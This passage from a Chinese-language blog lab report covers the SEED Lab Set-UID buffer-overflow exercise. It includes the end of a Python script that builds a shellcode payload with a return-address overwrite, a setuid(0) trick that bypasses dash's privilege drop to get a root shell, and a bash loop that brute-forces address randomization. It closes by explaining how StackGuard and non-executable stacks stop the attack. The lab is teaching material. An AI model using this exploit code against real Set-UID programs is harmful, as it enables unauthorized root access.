class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span>-<span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="comment"># Change this number </span></span><br><span class="line">content[start:start+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffdd70</span>+<span class="number">270</span><span class="comment"># Change this number</span></span><br><span class="line">offset = <span class="number">18</span></span><br><span class="line"> <span class="comment"># Change this number </span></span><br><span class="line">L=<span class="number">8</span></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset+L]=(ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
<p>**运行结果：**成功获取root shell</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021165418386.png" alt="image-20231021165418386"></p>
<h2 id="Tasks-7-Defeating-dash’s-Countermeasure"><strong>Tasks 7: Defeating</strong> <strong>dash’s Countermeasure</strong></h2>
<p>**任务要求：**在dash下发起攻击。</p>
<p><strong>实验过程：</strong></p>
<p>当EUID与RUID不同时，dash将EUID改为RUID，撤回特权。</p>
<p>由于root的UID为0，可以在shellcode执行execve之前setuid(0),将root-owned Set-UID程序的RUID设置为0.</p>
<p>于是在call_shellcode中加上setuid（0）的代码：</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021172646910.png" alt="image-20231021172646910"></p>
<p>Compile call shellcode.c into root-owned binary (by typing “make setuid”).</p>
<p>Run the shellcode a32.out and a64.out with or without the setuid(0) system call. Please describe and explain your observations.</p>
<p>编译并运行加上setuid(0)的shellcode.c的32位版本和64位版本，发现它们运行了root shell。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021172826821.png" alt="image-20231021172826821"></p>
<p>而不加setuid（0），运行两个普通shell。这是因为dash的保护机制，当EUID!=RUID时，EUID=RUID，撤回特权。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016192858811-1699522285245.png" alt="image-20231016192858811"></p>
<p><strong>运行结果：</strong></p>
<p>在dash shell中发起level 1 attack，成功。通过id，查看到uid=0。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021174152957.png" alt="image-20231021174152957"></p>
<p>而task3 中，uid=1000.</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231016231508202-1699522290624.png" alt="image-20231016231508202"></p>
<h2 id="Task-8-Defeating-Address-Randomization"><strong>Task 8: Defeating Address Randomization</strong></h2>
<p><strong>任务要求</strong>：打开地址随机化，并发起攻击。</p>
<p><strong>实验过程：</strong></p>
<p>地址随机化后，每次地址都不一样</p>
<p>修改stack.c中的内容，打印buffer的地址。可以看见buffer的地址每一次都在改变。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021192241834.png" alt="image-20231021192241834"></p>
<p>于是编写脚本重复地发起缓冲区溢出攻击，希望碰巧猜中栈的内存地址。</p>
<p>shell 脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line">while true; do</span><br><span class="line">value=$(( $value + 1 ))</span><br><span class="line">duration=$SECONDS</span><br><span class="line">min=$(($duration / 60))</span><br><span class="line">sec=$(($duration % 60))</span><br><span class="line">echo &quot;$min minutes and $sec seconds elapsed.&quot;</span><br><span class="line">echo &quot;The program has been running $value times so far.&quot;</span><br><span class="line">./stack-L1</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果：运行34秒（46880次）后，恶意代码得以执行。</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021192725424.png" alt="image-20231021192725424"></p>
<h2 id="Tasks-9-Experimenting-with-Other-Countermeasures"><strong>Tasks 9: Experimenting with Other Countermeasures</strong></h2>
<h3 id="Task-9-a-Turn-on-the-StackGuard-Protection"><strong>Task 9.a: Turn on the StackGuard Protection</strong></h3>
<p>**任务要求：**打开StackGuard Protection</p>
<p>关闭地址随机化后，在编译时打开StackGuard，再次发起攻击，攻击失败。因为StackGuard在缓冲区和返回地址之间放置一个哨兵值guard，并用一个秘密数secret初始化guard，将secret存放在BSS中。当发生缓冲区溢出时，哨兵值必然被覆盖并修改，此时比较哨兵值和秘密值，不相等即为检测到攻击，随即终止程序。</p>
<p>**运行效果：**stack smashing detected</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021194054523.png" alt="image-20231021194054523"></p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021194109640.png" alt="image-20231021194109640"></p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021194124274.png" alt="image-20231021194124274"></p>
<h3 id="Task-9-b-Turn-on-the-Non-executable-Stack-Protection"><strong>Task 9.b: Turn on the Non-executable Stack Protection</strong></h3>
<p>**任务要求：**打开不可执行栈</p>
<p>由于栈中的代码不可执行，所以无法实施缓冲区溢出攻击。</p>
<p>**运行效果：**segmentation fault</p>
<p><img src="https://xjelly-img-1318706121.cos.ap-beijing.myqcloud.com/content_img/image-20231021195004468.png" alt="image-20231021195004468"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Jellyfish0029.github.io">xjelly</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jellyfish0029.github.io/2023/11/09/SEED%20LAB%20Buffer%20overflow/">https://jellyfish0029.github.io/2023/11/09/SEED%20LAB%20Buffer%20overflow/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Jellyfish0029.github.io" target="_blank">Xjelly's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SEED-Lab/">SEED Lab</a><a class="post-meta__tags" href="/tags/Software-Security-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">Software Security 软件安全</a></div><div class="post_share"><div class="social-share" data-image="/images_config/index_img.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/18/SEED%20LAB%20Dirty%20Cow/" title="SEED LAB Dirty Cow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SEED LAB Dirty Cow</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/09/SEED%20LAB%20Shellshock/" title="SEED LAB Shellshock"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SEED LAB Shellshock</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/18/SEED%20LAB%20Dirty%20Cow/" title="SEED LAB Dirty Cow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-18</div><div class="title">SEED LAB Dirty Cow</div></div></a></div><div><a href="/2023/11/21/SEED%20LAB%20Format%20String/" title="SEED LAB Format String"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-21</div><div class="title">SEED LAB Format String</div></div></a></div><div><a href="/2023/11/09/SEED%20LAB%20Shellshock/" title="SEED LAB Shellshock"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-09</div><div class="title">SEED LAB Shellshock</div></div></a></div><div><a href="/2023/12/07/setup_of_syzkaller/" title="Set up Syzkaller (记录安装过程)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-07</div><div class="title">Set up Syzkaller (记录安装过程)</div></div></a></div><div><a href="/2023/12/11/syzkaller_lab1/" title="Syzkaller实验报告（Crash Demo）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-11</div><div class="title">Syzkaller实验报告（Crash Demo）</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81OTMzNC8zNTc5Ng=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images_config/index_img.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">xjelly</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Jellyfish0029" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xjelly0029@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Buffer Overflow (Set-UID)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Getting-Familiar-with-Shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">Task 1: Getting Familiar with Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Understanding-the-Vulnerable-Program"><span class="toc-number">1.2.</span> <span class="toc-text">Task 2: Understanding the Vulnerable Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Launching-Attack-on-32-bit-Program-Level-1"><span class="toc-number">1.3.</span> <span class="toc-text">Task 3: Launching Attack on 32-bit Program (Level 1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><span class="toc-number">1.4.</span> <span class="toc-text">Task 4: Launching Attack without Knowing Buffer Size (Level 2)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3"><span class="toc-number">1.5.</span> <span class="toc-text">Task 5: Launching Attack on 64-bit Program (Level 3)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Launching-Attack-on-64-bit-Program-Level-4"><span class="toc-number">1.6.</span> <span class="toc-text">Task 6: Launching Attack on 64-bit Program (Level 4)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-7-Defeating-dash%E2%80%99s-Countermeasure"><span class="toc-number">1.7.</span> <span class="toc-text">Tasks 7: Defeating dash’s Countermeasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-8-Defeating-Address-Randomization"><span class="toc-number">1.8.</span> <span class="toc-text">Task 8: Defeating Address Randomization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-9-Experimenting-with-Other-Countermeasures"><span class="toc-number">1.9.</span> <span class="toc-text">Tasks 9: Experimenting with Other Countermeasures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-9-a-Turn-on-the-StackGuard-Protection"><span class="toc-number">1.9.1.</span> <span class="toc-text">Task 9.a: Turn on the StackGuard Protection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-9-b-Turn-on-the-Non-executable-Stack-Protection"><span class="toc-number">1.9.2.</span> <span class="toc-text">Task 9.b: Turn on the Non-executable Stack Protection</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE/" title="安全协议">安全协议</a><time datetime="2024-05-11T06:42:54.000Z" title="发表于 2024-05-11 14:42:54">2024-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/11/%E5%AE%89%E5%85%A8%E5%A4%9A%E6%96%B9%E8%AE%A1%E7%AE%97/" title="安全多方计算">安全多方计算</a><time datetime="2024-05-11T06:25:21.000Z" title="发表于 2024-05-11 14:25:21">2024-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/11/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%BD%93%E5%88%B6/" title="非对称加密体制">非对称加密体制</a><time datetime="2024-05-11T06:09:18.000Z" title="发表于 2024-05-11 14:09:18">2024-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/11/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%BD%93%E5%88%B6/" title="对称加密体制">对称加密体制</a><time datetime="2024-05-11T05:56:34.000Z" title="发表于 2024-05-11 13:56:34">2024-05-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/21/PGP/" title="PGP(实验)">PGP(实验)</a><time datetime="2024-04-21T07:55:42.000Z" title="发表于 2024-04-21 15:55:42">2024-04-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By xjelly</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>(()=>{
  const loadLivere = () => {
    if (typeof LivereTower === 'object') window.LivereTower.init()
    else {
      (function(d, s) {
          var j, e = d.getElementsByTagName(s)[0];
          if (typeof LivereTower === 'function') { return; }
          j = d.createElement(s);
          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
          j.async = true;
          e.parentNode.insertBefore(j, e);
      })(document, 'script');
    }
  }

  if ('Livere' === 'Livere' || !false) {
    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
    else loadLivere()
  } else {
    window.loadOtherComment = loadLivere
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>